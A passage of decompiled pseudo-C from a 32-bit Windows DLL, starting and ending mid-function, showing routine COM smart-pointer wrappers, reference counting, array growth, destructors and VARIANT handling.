  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_1007AC5A;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_100475FA, sub_100448D2);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_10047737(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10044A78(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10047132) --------------------------------------------------------
int *__userpurge sub_10047132@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_100477CE(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (10047187) --------------------------------------------------------
int *__userpurge sub_10047187@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_1004784A(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (100471EC) --------------------------------------------------------
int *__userpurge sub_100471EC@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_100478C6(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (10047241) --------------------------------------------------------
int *__userpurge sub_10047241@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_10047942(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (100472A6) --------------------------------------------------------
int *__thiscall sub_100472A6(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_100479BE(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004730A) --------------------------------------------------------
int *__userpurge sub_1004730A@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_10047A3A(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (1004735F) --------------------------------------------------------
int *__thiscall sub_1004735F(int *this, int *a2, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = this;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_10047AB6(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (100473C3) --------------------------------------------------------
_DWORD *__userpurge sub_100473C3@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  void *v5; // [esp-4h] [ebp-14h]

  sub_10041572(a2);
  *a2 = &off_10095258;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10040B9D(a2, v2, v4, v5);
  return a2;
}
// 10095258: using guessed type int (__thiscall *off_10095258)(void *Block, char);

//----- (10047417) --------------------------------------------------------
_DWORD *__stdcall sub_10047417(_DWORD *a1)
{
  unsigned int i; // esi

  sub_10041572(a1);
  *a1 = &off_10095258;
  for ( i = 1; i < 8; i *= 2 )
    ;
  sub_100419A8(a1, i);
  return a1;
}
// 10095258: using guessed type int (__thiscall *off_10095258)(void *Block, char);

//----- (1004745B) --------------------------------------------------------
int *__userpurge sub_1004745B@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v7; // [esp-4h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-10h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = (int *)a1;
  *a2 = 0;
  v3 = *a3;
  v4 = *a3 == 0;
  v8 = &v7;
  v7 = v3;
  if ( !v4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v9 = -1;
  v5 = sub_10047B32(a2, v7);
  if ( v5 < 0 && v5 != -2147467262 )
    sub_1004AEC0(v5);
  return a2;
}

//----- (100474C4) --------------------------------------------------------
_DWORD *__userpurge sub_100474C4@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10047508) --------------------------------------------------------
void __thiscall sub_10047508(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10047BC0((int)this);
}

//----- (1004755B) --------------------------------------------------------
_DWORD *__userpurge sub_1004755B@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004759F) --------------------------------------------------------
void __thiscall sub_1004759F(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10047BFA((int)this);
}

//----- (100475DE) --------------------------------------------------------
_DWORD *__thiscall sub_100475DE(_DWORD *Block, char a2)
{
  sub_10046C99(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100475FA) --------------------------------------------------------
_DWORD *__thiscall sub_100475FA(_DWORD *this)
{
  return sub_10044C62(this, 0);
}

//----- (10047668) --------------------------------------------------------
_DWORD *__stdcall sub_10047668(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10095C18;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095C18: using guessed type int (__thiscall *off_10095C18)(void *Block, char);

//----- (10047737) --------------------------------------------------------
_DWORD *__usercall sub_10047737@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10044CB8((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1004775C) --------------------------------------------------------
void __usercall sub_1004775C(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x84u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(v2 + 1, 8u, 16, (void (__thiscall *)(void *))sub_100475FA, sub_100448D2);
  }
  a1[3] = v1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100477CE) --------------------------------------------------------
int __thiscall sub_100477CE(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095CE0, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047CB3(this, v4);
  }
  else
  {
    sub_10047C9D(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 100477F0: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004784A) --------------------------------------------------------
int __thiscall sub_1004784A(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095CF0, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047C82(this, v4);
  }
  else
  {
    sub_10047C6C(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004786C: conditional instruction was optimized away because %arg_0.4!=0

//----- (100478C6) --------------------------------------------------------
int __thiscall sub_100478C6(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095D00, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047D46(this, v4);
  }
  else
  {
    sub_10047D30(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 100478E8: conditional instruction was optimized away because %arg_0.4!=0

//----- (10047942) --------------------------------------------------------
int __thiscall sub_10047942(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095D10, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047D15(this, v4);
  }
  else
  {
    sub_10047CFF(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 10047964: conditional instruction was optimized away because %arg_0.4!=0

//----- (100479BE) --------------------------------------------------------
int __thiscall sub_100479BE(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095CD0, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047D77(this, v4);
  }
  else
  {
    sub_10047D61(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 100479E0: conditional instruction was optimized away because %arg_0.4!=0

//----- (10047A3A) --------------------------------------------------------
int __thiscall sub_10047A3A(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095CD0, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047CE4(this, v4);
  }
  else
  {
    sub_10047CCE(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 10047A5C: conditional instruction was optimized away because %arg_0.4!=0

//----- (10047AB6) --------------------------------------------------------
int __thiscall sub_10047AB6(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095CD0, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047CE4(this, v4);
  }
  else
  {
    sub_10047CCE(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 10047AD8: conditional instruction was optimized away because %arg_0.4!=0

//----- (10047B32) --------------------------------------------------------
int __thiscall sub_10047B32(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095D10, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_10047D15(this, v4);
  }
  else
  {
    sub_10047CFF(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 10047B54: conditional instruction was optimized away because %arg_0.4!=0

//----- (10047BC0) --------------------------------------------------------
void __usercall sub_10047BC0(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10047BFA) --------------------------------------------------------
void __usercall sub_10047BFA(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10047C22) --------------------------------------------------------
int __usercall sub_10047C22@<eax>(int a1@<esi>)
{
  if ( !*(_DWORD *)a1 )
    sub_1004AEC0(-2147467261);
  return *(_DWORD *)a1;
}

//----- (10047C6C) --------------------------------------------------------
int *__usercall sub_10047C6C@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047C82) --------------------------------------------------------
int __userpurge sub_10047C82@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047C9D) --------------------------------------------------------
int *__usercall sub_10047C9D@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047CB3) --------------------------------------------------------
int __userpurge sub_10047CB3@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047CCE) --------------------------------------------------------
int *__usercall sub_10047CCE@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047CE4) --------------------------------------------------------
int __userpurge sub_10047CE4@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047CFF) --------------------------------------------------------
int *__usercall sub_10047CFF@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047D15) --------------------------------------------------------
int __userpurge sub_10047D15@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047D30) --------------------------------------------------------
int *__usercall sub_10047D30@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047D46) --------------------------------------------------------
int __userpurge sub_10047D46@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047D61) --------------------------------------------------------
int *__usercall sub_10047D61@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (10047D77) --------------------------------------------------------
int __userpurge sub_10047D77@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (10047E1D) --------------------------------------------------------
_DWORD *__stdcall sub_10047E1D(_DWORD *a1)
{
  HANDLE EventA; // eax
  DWORD v3; // [esp-8h] [ebp-2Ch]
  int CurrentProcessId; // [esp-4h] [ebp-28h]
  _DWORD pExceptionObject[6]; // [esp+Ch] [ebp-18h] BYREF

  *a1 = off_10095D20;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  EventA = CreateEventA(0, 0, 0, 0);
  sub_10029136(a1 + 1, EventA, 0, 0, v3, CurrentProcessId);
  pExceptionObject[5] = 0;
  if ( !a1[2] )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 10095D20: using guessed type int (__thiscall *off_10095D20[2])(void *Block, char);

//----- (10047E90) --------------------------------------------------------
_DWORD *__thiscall sub_10047E90(_DWORD *Block, char a2)
{
  sub_10047EAC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10047EAC) --------------------------------------------------------
bool __thiscall sub_10047EAC(_DWORD *this)
{
  *this = off_10095D20;
  return sub_10014389(this + 1);
}
// 10095D20: using guessed type int (__thiscall *off_10095D20[2])(void *Block, char);

//----- (10047EE6) --------------------------------------------------------
BOOL __cdecl sub_10047EE6(void *Buf1, void *Buf2)
{
  return memcmp(Buf1, Buf2, 0x10u) == 0;
}

//----- (10047F15) --------------------------------------------------------
VARIANTARG *__usercall sub_10047F15@<eax>(VARIANTARG *result@<eax>)
{
  if ( result->vt != 1 )
  {
    result = (VARIANTARG *)VariantChangeType(result, result, 0, 1u);
    if ( (int)result < 0 )
      sub_1004AEC0((int)result);
  }
  return result;
}

//----- (10047F56) --------------------------------------------------------
int __thiscall sub_10047F56(_DWORD *this)
{
  return this[7];
}

//----- (10047F5A) --------------------------------------------------------
int __stdcall sub_10047F5A(int a1, _DWORD *a2)
{
  if ( a2 && *a2 == 3656208 )
    *a2 = 3656210;
  return -2147467263;
}

//----- (10047F78) --------------------------------------------------------
int __stdcall sub_10047F78(int a1, int a2, int a3, int a4)
{
  return -2147467263;
}

//----- (10047F80) --------------------------------------------------------
int __stdcall sub_10047F80(int a1, int a2, int a3, int a4, int a5, int a6)
{
  return -2147467263;
}

//----- (10047F88) --------------------------------------------------------
int __stdcall sub_10047F88(int a1, int a2, int pExceptionObject)
{
  int v3; // eax
  _DWORD *v4; // eax
  LONG v5; // eax
  VARIANTARG pvarg; // [esp+1Ch] [ebp-20h] BYREF
  void *Block; // [esp+2Ch] [ebp-10h]
  int v9; // [esp+38h] [ebp-4h]

  v9 = 0;
  *(_DWORD *)a1 = &off_10095D24;
  LOBYTE(v9) = 1;
  *(_DWORD *)a1 = &off_10095D4C;
  *(_DWORD *)(a1 + 4) = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  VariantInit((VARIANTARG *)(a1 + 8));
  v3 = pExceptionObject;
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 24) = v3;
  v4 = operator new(0xCu);
  Block = v4;
  LOBYTE(v9) = 4;
  if ( v4 )
  {
    v4[1] = 0;
    *v4 = &off_10095D2C;
    v4[2] = a1;
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v9) = 3;
  *(_DWORD *)(a1 + 32) = v4;
  if ( !v4 || !a2 || !pExceptionObject )
    goto LABEL_17;
  (*(void (__stdcall **)(_DWORD *))(*v4 + 4))(v4);
  if ( !*(_DWORD *)(a1 + 4) )
    sub_1004AEC0(-2147467261);
  if ( (*(int (__stdcall **)(_DWORD, int))(**(_DWORD **)(a1 + 4) + 84))(*(_DWORD *)(a1 + 4), a1 + 8) < 0 )
  {
    sub_10047F15((VARIANTARG *)(a1 + 8));
    if ( !*(_DWORD *)(a1 + 4) )
      sub_1004AEC0(-2147467261);
    (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(a1 + 4) + 80))(
      *(_DWORD *)(a1 + 4),
      *(_DWORD *)(a1 + 8),
      *(_DWORD *)(a1 + 12),
      *(_DWORD *)(a1 + 16),
      *(_DWORD *)(a1 + 20));
    if ( !*(_DWORD *)(a1 + 4) )
      sub_1004AEC0(-2147467261);
    if ( (*(int (__stdcall **)(_DWORD, int))(**(_DWORD **)(a1 + 4) + 84))(*(_DWORD *)(a1 + 4), a1 + 8) < 0 )
      goto LABEL_17;
  }
  v5 = *(_DWORD *)(a1 + 32);
  pvarg.vt = 9;
  pvarg.lVal = v5;
  if ( v5 )
    (*(void (__stdcall **)(LONG))(*(_DWORD *)v5 + 4))(v5);
  LOBYTE(v9) = 5;
  if ( !*(_DWORD *)(a1 + 4) )
    sub_1004AEC0(-2147467261);
  if ( (*(int (__stdcall **)(_DWORD, _DWORD, ULONG, LONG, LONG))(**(_DWORD **)(a1 + 4) + 80))(
         *(_DWORD *)(a1 + 4),
         *(_DWORD *)&pvarg.vt,
         pvarg.decVal.Hi32,
         pvarg.lVal,
         pvarg.cyVal.Hi) < 0 )
  {
LABEL_17:
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  *(_DWORD *)(a1 + 28) = pvarg.lVal;
  LOBYTE(v9) = 3;
  VariantClear(&pvarg);
  v9 = -1;
  (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return a1;
}
// 10048115: conditional instruction was optimized away because %arg_4.4!=0
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10095D24: using guessed type int (__thiscall *off_10095D24)(void *Block, char);
// 10095D2C: using guessed type int (__stdcall *off_10095D2C)(int, int, int);
// 10095D4C: using guessed type int (__thiscall *off_10095D4C)(void *Block, char);

//----- (10048130) --------------------------------------------------------
char *__thiscall sub_10048130(char *Block, char a2)
{
  sub_10048153(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10048153) --------------------------------------------------------
int __thiscall sub_10048153(char *this)
{
  int result; // eax
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10095D4C;
  v4 = 3;
  sub_100481E4((int)this);
  (*(void (__stdcall **)(_DWORD))(**((_DWORD **)this + 8) + 8))(*((_DWORD *)this + 8));
  v4 = 1;
  VariantClear((VARIANTARG *)(this + 8));
  LOBYTE(v4) = 0;
  result = *((_DWORD *)this + 1);
  if ( result )
    result = (*(int (__stdcall **)(_DWORD))(*(_DWORD *)result + 8))(*((_DWORD *)this + 1));
  *(_DWORD *)this = &off_10095D24;
  return result;
}
// 10095D24: using guessed type int (__thiscall *off_10095D24)(void *Block, char);
// 10095D4C: using guessed type int (__thiscall *off_10095D4C)(void *Block, char);

//----- (100481E4) --------------------------------------------------------
HRESULT __thiscall sub_100481E4(int this)
{
  VARIANTARG pvarg; // [esp+1Ch] [ebp-20h] BYREF
  int pExceptionObject; // [esp+2Ch] [ebp-10h] BYREF
  int v5; // [esp+38h] [ebp-4h]

  *(_DWORD *)(*(_DWORD *)(this + 32) + 8) = 0;
  VariantInit(&pvarg);
  v5 = 0;
  if ( !*(_DWORD *)(this + 4) )
    sub_1004AEC0(-2147467261);
  (*(void (__stdcall **)(_DWORD, VARIANTARG *))(**(_DWORD **)(this + 4) + 84))(*(_DWORD *)(this + 4), &pvarg);
  if ( pvarg.vt == 9 && *(_DWORD *)(this + 28) == pvarg.lVal )
  {
    if ( !*(_DWORD *)(this + 4) )
      sub_1004AEC0(-2147467261);
